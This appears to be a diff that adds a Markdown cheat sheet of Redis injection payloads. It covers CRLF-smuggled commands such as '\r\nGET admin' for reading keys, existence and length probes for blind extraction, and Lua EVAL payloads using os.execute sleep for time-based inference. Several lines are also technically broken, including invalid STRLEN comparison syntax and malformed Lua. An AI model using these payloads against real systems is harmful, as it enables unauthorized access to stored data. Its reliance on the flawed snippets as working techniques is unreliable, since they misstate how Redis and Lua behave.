@@ -1,0 +1,46 @@
+# Redis
+
+Redis is a key-value store, so "injection" typically involves command injection if input is concatenated into commands, allowing retrieval of keys or values.
+
+## Error-based
+Inject invalid commands to trigger errors that may reveal info.
+
+To test with invalid command:
+\r\nINVALID to cause syntax error.
+
+## Stacked (union-like)
+Append commands to execute additional ones, like GET to retrieve a key's value.
+
+To retrieve value of key 'admin':
+\r\nGET admin
+
+To check if key exists:
+\r\nEXISTS admin (returns 1 if true)
+
+## Boolean-based blind
+Use commands that return 1/0 based on condition, infer from app.
+
+To find length of value in key 'admin' (if string):
+
+STRLEN admin >16
+\r\nSTRLEN admin >16 (returns length, but for blind, assume app shows existence or not)
+
+For binary search, custom based on app.
+
+To "extract" char, use GETRANGE, but for blind, need to test conditions if possible.
+
+Limited; use for existence check as proof.
+
+## Time-based blind
+If Lua scripting enabled, use EVAL with sleep.
+
+Base delay:
+\r\nEVAL "os.execute('sleep 5')" 0
+
+Condition for key exists:
+\r\nEVAL "if redis.call('exists','admin')==1 then os.execute('sleep 5') end" 0
+
+Adapt for length: if(redis.call('strlen','admin') >16) os.execute('sleep 5')
+
+Binary search similar for length and chars (using string.byte for ASCII).
+
